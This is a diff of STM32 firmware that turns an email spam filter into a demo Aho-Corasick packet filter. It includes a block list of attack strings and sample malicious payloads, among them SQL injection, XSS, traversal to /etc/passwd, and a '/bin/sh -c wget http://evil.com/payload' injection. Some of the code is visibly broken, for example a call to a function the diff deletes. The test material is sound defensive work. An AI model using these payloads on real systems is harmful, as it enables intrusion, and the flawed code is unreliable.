@@ -1,17 +1,28 @@
 /* USER CODE BEGIN Header */
 /**
- ******************************************************************************
- * @file           : main.c
- * @brief          : Refatorado para Filtro de SPAM com Aho-Corasick
- ******************************************************************************
- */
+  ******************************************************************************
+  * @file           : main.c
+  * @brief          : STM32 Network Packet Filter using Aho-Corasick Algorithm
+  ******************************************************************************
+  * Network packet filtering with realistic pattern count for 80 vertices
+  * Estimated ~15-20 patterns maximum for 80 vertices
+  * Static Input for demonstration and testing
+  * 
+  * Features:
+  * - Real network threat patterns detection
+  * - Static packet samples for testing
+  * - UART output for results
+  * - LED indicators for threats
+  * - Optimized for STM32F030R8 constraints
+  ******************************************************************************
+  */
 /* USER CODE END Header */
+
 /* Includes ------------------------------------------------------------------*/
 #include "main.h"
-#include <stdio.h> // Ainda necessário para snprintf
-#include <string.h>
-#include <stdbool.h> // Adicionado para usar o tipo bool
 #include "aho_corasick.h"
+#include <string.h>
+#include <stdio.h>
 
 /* Private includes ----------------------------------------------------------*/
 /* USER CODE BEGIN Includes */
@@ -20,20 +31,35 @@
 
 /* Private typedef -----------------------------------------------------------*/
 /* USER CODE BEGIN PTD */
-// Estrutura para simular um e-mail
+
 typedef struct {
-    const char* from;
-    const char* subject;
-    const char* body;
-} Email;
+    const char* name;
+    const char* content;
+    uint16_t length;
+    bool is_malicious;
+} network_packet_t;
+
+typedef struct {
+    uint32_t total_packets;
+    uint32_t malicious_packets;
+    uint32_t clean_packets;
+    uint32_t total_threats_found;
+    uint32_t current_packet_threats;
+} filter_stats_t;
 
 /* USER CODE END PTD */
 
 /* Private define ------------------------------------------------------------*/
 /* USER CODE BEGIN PD */
-#define NUM_SPAM_KEYWORDS 12
-#define NUM_EMAILS 4
-#define UART_TX_TIMEOUT 100 // Timeout para transmissão UART em ms
+
+#define LED_GREEN_Pin GPIO_PIN_5
+#define LED_GREEN_GPIO_Port GPIOA
+#define USER_BUTTON_Pin GPIO_PIN_13
+#define USER_BUTTON_GPIO_Port GPIOC
+
+#define NUM_TEST_PACKETS 10
+#define NUM_THREAT_PATTERNS 16
+
 /* USER CODE END PD */
 
 /* Private macro -------------------------------------------------------------*/
@@ -43,44 +69,97 @@ typedef struct {
 
 /* Private variables ---------------------------------------------------------*/
 UART_HandleTypeDef huart2;
-ac_automaton_t ac_spam_filter; // Nome da variável mais descritivo
 
 /* USER CODE BEGIN PV */
 
-// --- Base de Dados para o Filtro de SPAM ---
-
-// 1. Padrões (palavras-chave) de SPAM a serem procurados
-const char* spam_keywords[NUM_SPAM_KEYWORDS] = {
-    "oferta", "gratis", "promocao", "desconto",
-    "clique aqui", "renda extra", "viagra", "urgente", "tigrinho", "vaga", "pishing", "virus"
+// Network threat patterns - optimized for ~80 vertices
+static const char* network_threat_patterns[NUM_THREAT_PATTERNS] = {
+    // SQL Injection patterns
+    "' OR 1=1",         // 8 chars
+    "UNION SELECT",     // 12 chars
+    "DROP TABLE",       // 10 chars
+    "admin'--",         // 8 chars
+    
+    // XSS patterns
+    "<script>",         // 8 chars
+    "javascript:",      // 11 chars
+    "alert(",           // 6 chars
+    
+    // Command injection
+    "/bin/sh",          // 7 chars
+    "cmd.exe",          // 7 chars
+    "wget ",            // 5 chars
+    
+    // Network exploits
+    "nc -l",            // 5 chars
+    "nmap",             // 4 chars
+    
+    // File inclusion
+    "../",              // 3 chars
+    "..\\",             // 3 chars
+    
+    // Malware indicators
+    "payload",          // 7 chars
+    "exploit"           // 7 chars
 };
 
-// 2. Lista de e-mails para simular uma caixa de entrada
-Email email_inbox[NUM_EMAILS] = {
+// Static test packets simulating network traffic
+static const network_packet_t test_packets[NUM_TEST_PACKETS] = {
     {
-        "amigo@email.com",
-        "Re: Nosso almoco",
-        "Oi, tudo bem? So confirmando nosso encontro na sexta-feira. Abracos."
+        "HTTP Request",
+        "GET /index.html HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0\r\n\r\n",
+        0, false
     },
     {
-        "vendas@loja-suspeita.com",
-        "OFERTA IMPERDIVEL! So hoje!",
-        "Parabens! Voce ganhou um super desconto de 90%. Para garantir sua renda extra, clique aqui agora!"
+        "SQL Injection Attack",
+        "POST /login HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nusername=admin'-- &password=test",
+        0, true
     },
     {
-        "chefe@empresa.com",
-        "Relatorio Semanal",
-        "Por favor, envie o relatorio de vendas ate o final do dia. Obrigado."
+        "XSS Attack",
+        "GET /search?q=<script>alert('XSS')</script> HTTP/1.1\r\nHost: vulnerable.com\r\n\r\n",
+        0, true
     },
     {
-        "spam@propaganda.com",
-        "Sua saude em primeiro lugar",
-        "Temos um produto com preco gratis para voce, compre viagra com seguranca."
+        "Directory Traversal",
+        "GET /../../../etc/passwd HTTP/1.1\r\nHost: target.com\r\n\r\n",
+        0, true
+    },
+    {
+        "Normal HTTPS",
+        "GET /secure/data HTTP/1.1\r\nHost: secure.com\r\nAuthorization: Bearer token123\r\n\r\n",
+        0, false
+    },
+    {
+        "Command Injection",
+        "POST /system HTTP/1.1\r\nContent-Type: text/plain\r\n\r\ncmd=ls; /bin/sh -c 'wget http://evil.com/payload'",
+        0, true
+    },
+    {
+        "Port Scan Detection",
+        "TCP SYN scan detected: nmap -sS -O target_host attempting port enumeration",
+        0, true
+    },
+    {
+        "File Upload",
+        "POST /upload HTTP/1.1\r\nContent-Type: multipart/form-data\r\n\r\nfilename=document.pdf",
+        0, false
+    },
+    {
+        "SQL Union Attack",
+        "GET /products?id=1 UNION SELECT username,password FROM users HTTP/1.1\r\n\r\n",
+        0, true
+    },
+    {
+        "Clean API Call",
+        "POST /api/v1/users HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{\"name\":\"John\",\"email\":\"john@example.com\"}",
+        0, false
     }
 };
 
-// Variável de estado para a detecção no e-mail atual
-bool g_spam_found_in_current_email = false;
+static ac_automaton_t packet_filter;
+static filter_stats_t stats;
+static char output_buffer[256];
 
 /* USER CODE END PV */
 
@@ -88,34 +167,184 @@ bool g_spam_found_in_current_email = false;
 void SystemClock_Config(void);
 static void MX_GPIO_Init(void);
 static void MX_USART2_UART_Init(void);
+
 /* USER CODE BEGIN PFP */
 
-// Função auxiliar para enviar strings via UART
-void UART_Transmit_String(const char* str) {
-    HAL_UART_Transmit(&huart2, (uint8_t*)str, strlen(str), UART_TX_TIMEOUT);
-}
+static void init_packet_filter(void);
+static void process_packet(const network_packet_t* packet);
+static void analyze_all_packets(void);
+static void print_statistics(void);
+static void print_packet_analysis(const network_packet_t* packet);
+static void threat_detected_callback(const char* pattern, int position);
+static void indicate_threat_led(void);
+static void indicate_clean_led(void);
 
-// Callback chamado quando uma palavra-chave de SPAM é encontrada
-void on_spam_match_found(const char* pattern, int position)
-{
-    char buffer[128];
-    int len = snprintf(buffer, sizeof(buffer), "    [!] Palavra de SPAM encontrada: '%s'\r\n", pattern);
-    HAL_UART_Transmit(&huart2, (uint8_t*)buffer, len, UART_TX_TIMEOUT);
-
-    // Marca o e-mail atual como SPAM
-    g_spam_found_in_current_email = true;
-
-    // Pisca o LED para indicar uma detecção
-//    HAL_GPIO_TogglePin(LD2_GPIO_Port, LD2_Pin);
-//    HAL_Delay(50);
-//    HAL_GPIO_TogglePin(LD2_GPIO_Port, LD2_Pin);
-}
-
-// O retarget de printf foi removido
 /* USER CODE END PFP */
 
-/* Private user code ---------------------------------------------------------*/
 /* USER CODE BEGIN 0 */
+
+/**
+ * @brief Callback executado quando uma ameaça é detectada
+ */
+static void threat_detected_callback(const char* pattern, int position) {
+    stats.total_threats_found++;
+    stats.current_packet_threats++;
+    
+    // Log da ameaça detectada
+    snprintf(output_buffer, sizeof(output_buffer), 
+             "    THREAT: Pattern '%s' found at position %d\r\n", pattern, position);
+    HAL_UART_Transmit(&huart2, (uint8_t*)output_buffer, strlen(output_buffer), 1000);
+}
+
+/**
+ * @brief Inicializa o filtro de pacotes
+ */
+static void init_packet_filter(void) {
+    // Inicializa o autômato Aho-Corasick
+    ac_init(&packet_filter, threat_detected_callback);
+    
+    // Adiciona todos os padrões de ameaças
+    uint8_t patterns_loaded = 0;
+    for (int i = 0; i < NUM_THREAT_PATTERNS; i++) {
+        if (ac_add_pattern(&packet_filter, network_threat_patterns[i])) {
+            patterns_loaded++;
+        } else {
+            snprintf(output_buffer, sizeof(output_buffer), 
+                     "ERROR: Failed to load pattern %d: '%s'\r\n", i, network_threat_patterns[i]);
+            HAL_UART_Transmit(&huart2, (uint8_t*)output_buffer, strlen(output_buffer), 1000);
+            break;
+        }
+    }
+    
+    // Constrói o autômato
+    ac_build(&packet_filter);
+    
+    // Inicializa estatísticas
+    memset(&stats, 0, sizeof(stats));
+    
+    // Calcula tamanhos dos pacotes
+    for (int i = 0; i < NUM_TEST_PACKETS; i++) {
+        ((network_packet_t*)&test_packets[i])->length = strlen(test_packets[i].content);
+    }
+    
+    // Relatório de inicialização
+    snprintf(output_buffer, sizeof(output_buffer), 
+             "\r\n=== STM32 Network Packet Filter Initialized ===\r\n"
+             "Threat patterns loaded: %d/%d\r\n"
+             "Vertices used: %d/80\r\n"
+             "Test packets ready: %d\r\n\r\n",
+             patterns_loaded, NUM_THREAT_PATTERNS, 
+             packet_filter.vertex_count, NUM_TEST_PACKETS);
+    HAL_UART_Transmit(&huart2, (uint8_t*)output_buffer, strlen(output_buffer), 2000);
+}
+
+/**
+ * @brief Processa um único pacote
+ */
+static void process_packet(const network_packet_t* packet) {
+    stats.total_packets++;
+    stats.current_packet_threats = 0;
+    
+    // Analisa o pacote com Aho-Corasick
+    ac_search(&packet_filter, packet->content);
+    
+    // Classifica o resultado
+    if (stats.current_packet_threats > 0) {
+        stats.malicious_packets++;
+        indicate_threat_led();
+    } else {
+        stats.clean_packets++;
+        indicate_clean_led();
+    }
+    
+    // Imprime análise do pacote
+    print_packet_analysis(packet);
+}
+
+/**
+ * @brief Imprime análise detalhada do pacote
+ */
+static void print_packet_analysis(const network_packet_t* packet) {
+    const char* status = (stats.current_packet_threats > 0) ? "MALICIOUS" : "CLEAN";
+    const char* expected = packet->is_malicious ? "MALICIOUS" : "CLEAN";
+    const char* result = (stats.current_packet_threats > 0) == packet->is_malicious ? "CORRECT" : "MISSED";
+    
+    snprintf(output_buffer, sizeof(output_buffer), 
+             "Packet: %s\r\n"
+             "  Size: %d bytes\r\n"
+             "  Status: %s (%d threats)\r\n"
+             "  Expected: %s\r\n"
+             "  Detection: %s\r\n\r\n",
+             packet->name, packet->length, status, 
+             stats.current_packet_threats, expected, result);
+    HAL_UART_Transmit(&huart2, (uint8_t*)output_buffer, strlen(output_buffer), 2000);
+}
+
+/**
+ * @brief Analisa todos os pacotes de teste
+ */
+static void analyze_all_packets(void) {
+    HAL_UART_Transmit(&huart2, (uint8_t*)"=== Starting Packet Analysis ===\r\n\r\n", 38, 1000);
+    
+    for (int i = 0; i < NUM_TEST_PACKETS; i++) {
+        snprintf(output_buffer, sizeof(output_buffer), 
+                 "--- Analyzing Packet %d/%d ---\r\n", i+1, NUM_TEST_PACKETS);
+        HAL_UART_Transmit(&huart2, (uint8_t*)output_buffer, strlen(output_buffer), 1000);
+        
+        process_packet(&test_packets[i]);
+        
+        HAL_Delay(1000); // Pausa entre pacotes para visualização
+    }
+    
+    HAL_UART_Transmit(&huart2, (uint8_t*)"=== Analysis Complete ===\r\n\r\n", 31, 1000);
+}
+
+/**
+ * @brief Imprime estatísticas finais
+ */
+static void print_statistics(void) {
+    float detection_rate = (stats.total_packets > 0) ? 
+        (float)stats.malicious_packets / stats.total_packets * 100.0f : 0.0f;
+    
+    snprintf(output_buffer, sizeof(output_buffer), 
+             "=== FINAL STATISTICS ===\r\n"
+             "Total packets analyzed: %lu\r\n"
+             "Malicious packets: %lu\r\n"
+             "Clean packets: %lu\r\n"
+             "Total threats detected: %lu\r\n"
+             "Detection rate: %.1f%%\r\n"
+             "Vertices used: %d/80 (%.1f%%)\r\n"
+             "Patterns loaded: %d\r\n\r\n",
+             stats.total_packets, stats.malicious_packets, stats.clean_packets,
+             stats.total_threats_found, detection_rate,
+             packet_filter.vertex_count, 
+             (float)packet_filter.vertex_count / 80.0f * 100.0f,
+             packet_filter.pattern_count);
+    HAL_UART_Transmit(&huart2, (uint8_t*)output_buffer, strlen(output_buffer), 3000);
+}
+
+/**
+ * @brief Indica ameaça detectada via LED
+ */
+static void indicate_threat_led(void) {
+    // LED pisca rápido (vermelho simulado)
+    for (int i = 0; i < 3; i++) {
+        HAL_GPIO_WritePin(LED_GREEN_GPIO_Port, LED_GREEN_Pin, GPIO_PIN_SET);
+        HAL_Delay(100);
+        HAL_GPIO_WritePin(LED_GREEN_GPIO_Port, LED_GREEN_Pin, GPIO_PIN_RESET);
+        HAL_Delay(100);
+    }
+}
+
+/**
+ * @brief Indica pacote limpo via LED
+ */
+static void indicate_clean_led(void) {
+    // LED acende por 200ms (verde)
+    HAL_GPIO_WritePin(LED_GREEN_GPIO_Port, LED_GREEN_Pin, GPIO_PIN_SET);
+    HAL_Delay(200);
+    HAL_GPIO_WritePin(LED_GREEN_GPIO_Port, LED_GREEN_Pin, GPIO_PIN_RESET);
+}
 
 /* USER CODE END 0 */
 
@@ -123,119 +352,131 @@ void on_spam_match_found(const char* pattern, int position)
   * @brief  The application entry point.
   * @retval int
   */
-int main(void)
-{
-  /* --- 1. INICIALIZAÇÃO DO HARDWARE E DO AUTÔMATO (EXECUTADO UMA VEZ) --- */
+int main(void) {
+  /* USER CODE BEGIN 1 */
+
+  /* USER CODE END 1 */
+
+  /* MCU Configuration--------------------------------------------------------*/
+
+  /* Reset of all peripherals, Initializes the Flash interface and the Systick. */
   HAL_Init();
+
+  /* USER CODE BEGIN Init */
+
+  /* USER CODE END Init */
+
+  /* Configure the system clock */
   SystemClock_Config();
+
+  /* USER CODE BEGIN SysInit */
+
+  /* USER CODE END SysInit */
+
+  /* Initialize all configured peripherals */
   MX_GPIO_Init();
   MX_USART2_UART_Init();
 
-  // Uma pequena pausa para garantir que o terminal serial esteja pronto
-  HAL_Delay(100);
+  /* USER CODE BEGIN 2 */
+  
+  // Inicialização do sistema
+  HAL_UART_Transmit(&huart2, (uint8_t*)"\r\n\r\nSTM32F030R8 Network Packet Filter\r\n", 37, 1000);
+  HAL_UART_Transmit(&huart2, (uint8_t*)"Initializing Aho-Corasick filter...\r\n", 38, 1000);
+  
+  // Inicializa o filtro de pacotes
+  init_packet_filter();
+  
+  // Indica sistema pronto
+  HAL_GPIO_WritePin(LED_GREEN_GPIO_Port, LED_GREEN_Pin, GPIO_PIN_SET);
+  HAL_Delay(500);
+  HAL_GPIO_WritePin(LED_GREEN_GPIO_Port, LED_GREEN_Pin, GPIO_PIN_RESET);
 
   UART_Transmit_String("--- Filtro de SPAM Aho-Corasick STM32 ---\r\n");
   UART_Transmit_String("Inicializando e construindo base de dados de SPAM...\r\n\r\n");
 
-  // Inicializa o autômato com o novo callback
-  ac_init(&ac_spam_filter, on_spam_match_found);
+  /* Infinite loop */
+  /* USER CODE BEGIN WHILE */
+  while (1) {
+    /* USER CODE END WHILE */
 
-  // Adiciona as palavras-chave de SPAM ao autômato
-  for (int i = 0; i < NUM_SPAM_KEYWORDS; ++i) {
-    ac_add_pattern(&ac_spam_filter, spam_keywords[i]);
+    /* USER CODE BEGIN 3 */
+    
+    // Executa análise completa dos pacotes
+    analyze_all_packets();
+    
+    // Mostra estatísticas finais
+    print_statistics();
+    
+    // Lista padrões carregados
+    HAL_UART_Transmit(&huart2, (uint8_t*)"=== LOADED THREAT PATTERNS ===\r\n", 33, 1000);
+    for (int i = 0; i < packet_filter.pattern_count; i++) {
+        snprintf(output_buffer, sizeof(output_buffer), 
+                 "%2d: '%s'\r\n", i+1, packet_filter.patterns[i]);
+        HAL_UART_Transmit(&huart2, (uint8_t*)output_buffer, strlen(output_buffer), 500);
+    }
+    
+    // Aguarda botão do usuário para reiniciar
+    HAL_UART_Transmit(&huart2, (uint8_t*)"\r\nPress USER button to restart analysis...\r\n\r\n", 46, 1000);
+    
+    // Aguarda botão ser pressionado
+    while (HAL_GPIO_ReadPin(USER_BUTTON_GPIO_Port, USER_BUTTON_Pin) == GPIO_PIN_SET) {
+        // LED heartbeat enquanto aguarda
+        HAL_GPIO_TogglePin(LED_GREEN_GPIO_Port, LED_GREEN_Pin);
+        HAL_Delay(1000);
+    }
+    
+    // Debounce do botão
+    HAL_Delay(200);
+    while (HAL_GPIO_ReadPin(USER_BUTTON_GPIO_Port, USER_BUTTON_Pin) == GPIO_PIN_RESET) {
+        HAL_Delay(10);
+    }
+    
+    // Reset das estatísticas para nova análise
+    memset(&stats, 0, sizeof(stats));
+    
+    HAL_UART_Transmit(&huart2, (uint8_t*)"\r\n" "=== RESTARTING ANALYSIS ===\r\n\r\n", 33, 1000);
   }
-
-  // Constrói a máquina de estados Aho-Corasick. Agora ela está pronta.
-  ac_build(&ac_spam_filter);
-  UART_Transmit_String("Filtro pronto para analisar e-mails.\r\n");
-  UART_Transmit_String("----------------------------------------\r\n\r\n");
-
-  // Itera sobre a lista de e-mails, simulando a chegada de novas mensagens
-  while(1) {
-	  for (int i = 0; i < NUM_EMAILS; ++i) {
-		  const Email* current_email = &email_inbox[i];
-		  char buffer[256];
-		  int len;
-
-		  len = snprintf(buffer, sizeof(buffer), "Analisando E-mail %d de '%s'...\r\n", i + 1, current_email->from);
-		  HAL_UART_Transmit(&huart2, (uint8_t*)buffer, len, UART_TX_TIMEOUT);
-
-		  len = snprintf(buffer, sizeof(buffer), "  Assunto: %s\r\n", current_email->subject);
-		  HAL_UART_Transmit(&huart2, (uint8_t*)buffer, len, UART_TX_TIMEOUT);
-
-		  // Reseta o status de SPAM para o e-mail atual
-		  g_spam_found_in_current_email = false;
-
-		  // Executa a busca no assunto e no corpo do e-mail
-		  ac_search(&ac_spam_filter, current_email->subject);
-		  ac_search(&ac_spam_filter, current_email->body);
-
-		  // Apresenta o veredito final para o e-mail
-		  if (g_spam_found_in_current_email) {
-			  UART_Transmit_String("  VEREDITO: E-mail classificado como SPAM.\r\n\r\n");
-		  } else {
-			  UART_Transmit_String("  VEREDITO: E-mail legitimo.\r\n\r\n");
-		  }
-
-		  HAL_Delay(5000);
-	  }
-
-	  UART_Transmit_String("----------------------------------------\r\n");
-	  UART_Transmit_String("Todos os e-mails foram analisados. Reiniciando a demonstracao em 10s...\r\n");
-	  UART_Transmit_String("----------------------------------------\r\n\r\n");
-	  HAL_Delay(10000);
-  }
-
+  /* USER CODE END 3 */
 }
 
-/* O resto do arquivo (SystemClock_Config, etc.) permanece o mesmo */
-// ...
-
 /**
- * @brief System Clock Configuration
- * @retval None
- */
-void SystemClock_Config(void)
-{
+  * @brief System Clock Configuration
+  * @retval None
+  */
+void SystemClock_Config(void) {
   RCC_OscInitTypeDef RCC_OscInitStruct = {0};
   RCC_ClkInitTypeDef RCC_ClkInitStruct = {0};
 
   /** Initializes the RCC Oscillators according to the specified parameters
-   * in the RCC_OscInitTypeDef structure.
-   */
+  * in the RCC_OscInitStruct structure.
+  */
   RCC_OscInitStruct.OscillatorType = RCC_OSCILLATORTYPE_HSI;
   RCC_OscInitStruct.HSIState = RCC_HSI_ON;
   RCC_OscInitStruct.HSICalibrationValue = RCC_HSICALIBRATION_DEFAULT;
-  RCC_OscInitStruct.PLL.PLLState = RCC_PLL_ON;
-  RCC_OscInitStruct.PLL.PLLSource = RCC_PLLSOURCE_HSI;
-  RCC_OscInitStruct.PLL.PLLMUL = RCC_PLL_MUL12;
-  RCC_OscInitStruct.PLL.PREDIV = RCC_PREDIV_DIV1;
-  if (HAL_RCC_OscConfig(&RCC_OscInitStruct) != HAL_OK)
-  {
+  RCC_OscInitStruct.PLL.PLLState = RCC_PLL_NONE;
+  if (HAL_RCC_OscConfig(&RCC_OscInitStruct) != HAL_OK) {
     Error_Handler();
   }
 
   /** Initializes the CPU, AHB and APB buses clocks
-   */
-  RCC_ClkInitStruct.ClockType = RCC_CLOCKTYPE_HCLK | RCC_CLOCKTYPE_SYSCLK | RCC_CLOCKTYPE_PCLK1;
-  RCC_ClkInitStruct.SYSCLKSource = RCC_SYSCLKSOURCE_PLLCLK;
+  */
+  RCC_ClkInitStruct.ClockType = RCC_CLOCKTYPE_HCLK|RCC_CLOCKTYPE_SYSCLK
+                              |RCC_CLOCKTYPE_PCLK1;
+  RCC_ClkInitStruct.SYSCLKSource = RCC_SYSCLKSOURCE_HSI;
   RCC_ClkInitStruct.AHBCLKDivider = RCC_SYSCLK_DIV1;
   RCC_ClkInitStruct.APB1CLKDivider = RCC_HCLK_DIV1;
 
-  if (HAL_RCC_ClockConfig(&RCC_ClkInitStruct, FLASH_LATENCY_1) != HAL_OK)
-  {
+  if (HAL_RCC_ClockConfig(&RCC_ClkInitStruct, FLASH_LATENCY_0) != HAL_OK) {
     Error_Handler();
   }
 }
 
 /**
- * @brief USART2 Initialization Function
- * @param None
- * @retval None
- */
-static void MX_USART2_UART_Init(void)
-{
-
+  * @brief USART2 Initialization Function
+  * @param None
+  * @retval None
+  */
+static void MX_USART2_UART_Init(void) {
   /* USER CODE BEGIN USART2_Init 0 */
 
   /* USER CODE END USART2_Init 0 */
@@ -244,17 +485,14 @@ static void MX_USART2_UART_Init(void)
 
   /* USER CODE END USART2_Init 1 */
   huart2.Instance = USART2;
-  huart2.Init.BaudRate = 38400;
+  huart2.Init.BaudRate = 115200;
   huart2.Init.WordLength = UART_WORDLENGTH_8B;
   huart2.Init.StopBits = UART_STOPBITS_1;
   huart2.Init.Parity = UART_PARITY_NONE;
   huart2.Init.Mode = UART_MODE_TX_RX;
   huart2.Init.HwFlowCtl = UART_HWCONTROL_NONE;
   huart2.Init.OverSampling = UART_OVERSAMPLING_16;
-  huart2.Init.OneBitSampling = UART_ONE_BIT_SAMPLE_DISABLE;
-  huart2.AdvancedInit.AdvFeatureInit = UART_ADVFEATURE_NO_INIT;
-  if (HAL_UART_Init(&huart2) != HAL_OK)
-  {
+  if (HAL_UART_Init(&huart2) != HAL_OK) {
     Error_Handler();
   }
   /* USER CODE BEGIN USART2_Init 2 */
@@ -263,36 +501,32 @@ static void MX_USART2_UART_Init(void)
 }
 
 /**
- * @brief GPIO Initialization Function
- * @param None
- * @retval None
- */
-static void MX_GPIO_Init(void)
-{
+  * @brief GPIO Initialization Function
+  * @param None
+  * @retval None
+  */
+static void MX_GPIO_Init(void) {
   GPIO_InitTypeDef GPIO_InitStruct = {0};
-  /* USER CODE BEGIN MX_GPIO_Init_1 */
-
-  /* USER CODE END MX_GPIO_Init_1 */
 
   /* GPIO Ports Clock Enable */
   __HAL_RCC_GPIOC_CLK_ENABLE();
-  __HAL_RCC_GPIOF_CLK_ENABLE();
   __HAL_RCC_GPIOA_CLK_ENABLE();
 
-  /*Configure GPIO pin : B1_Pin */
-  GPIO_InitStruct.Pin = B1_Pin;
-  GPIO_InitStruct.Mode = GPIO_MODE_IT_FALLING;
-  GPIO_InitStruct.Pull = GPIO_NOPULL;
-  HAL_GPIO_Init(B1_GPIO_Port, &GPIO_InitStruct);
+  /*Configure GPIO pin Output Level */
+  HAL_GPIO_WritePin(LED_GREEN_GPIO_Port, LED_GREEN_Pin, GPIO_PIN_RESET);
 
-  /* USER CODE BEGIN MX_GPIO_Init_2 */
-  /* Configure GPIO pin : LD2_Pin */
-//  GPIO_InitStruct.Pin = LD2_Pin;
+  /*Configure GPIO pin : USER_BUTTON_Pin */
+  GPIO_InitStruct.Pin = USER_BUTTON_Pin;
+  GPIO_InitStruct.Mode = GPIO_MODE_INPUT;
+  GPIO_InitStruct.Pull = GPIO_PULLUP;
+  HAL_GPIO_Init(USER_BUTTON_GPIO_Port, &GPIO_InitStruct);
+
+  /*Configure GPIO pin : LED_GREEN_Pin */
+  GPIO_InitStruct.Pin = LED_GREEN_Pin;
   GPIO_InitStruct.Mode = GPIO_MODE_OUTPUT_PP;
   GPIO_InitStruct.Pull = GPIO_NOPULL;
   GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_LOW;
-//  HAL_GPIO_Init(LD2_GPIO_Port, &GPIO_InitStruct);
-  /* USER CODE END MX_GPIO_Init_2 */
+  HAL_GPIO_Init(LED_GREEN_GPIO_Port, &GPIO_InitStruct);
 }
 
 /* USER CODE BEGIN 4 */
@@ -300,30 +534,26 @@ static void MX_GPIO_Init(void)
 /* USER CODE END 4 */
 
 /**
- * @brief  This function is executed in case of error occurrence.
- * @retval None
- */
-void Error_Handler(void)
-{
+  * @brief  This function is executed in case of error occurrence.
+  * @retval None
+  */
+void Error_Handler(void) {
   /* USER CODE BEGIN Error_Handler_Debug */
   /* User can add his own implementation to report the HAL error return state */
   __disable_irq();
-  while (1)
-  {
+  while (1) {
   }
   /* USER CODE END Error_Handler_Debug */
 }
 
-#ifdef USE_FULL_ASSERT
+#ifdef  USE_FULL_ASSERT
 /**
- * @brief  Reports the name of the source file and the source line number
- * where the assert_param error has occurred.
- * @param  file: pointer to the source file name
- * @param  line: assert_param error line source number
- * @retval None
- */
-void assert_failed(uint8_t *file, uint32_t line)
-{
+  * @brief  Reports the name and location of the C source file where the assert_param error has occurred.
+  * @param  file: pointer to the source file name
+  * @param  line: assert_param error line source number
+  * @retval None
+  */
+void assert_failed(uint8_t *file, uint32_t line) {
   /* USER CODE BEGIN 6 */
   /* User can add his own implementation to report the file name and line number,
      ex: printf("Wrong parameters value: file %s on line %d\r\n", file, line) */
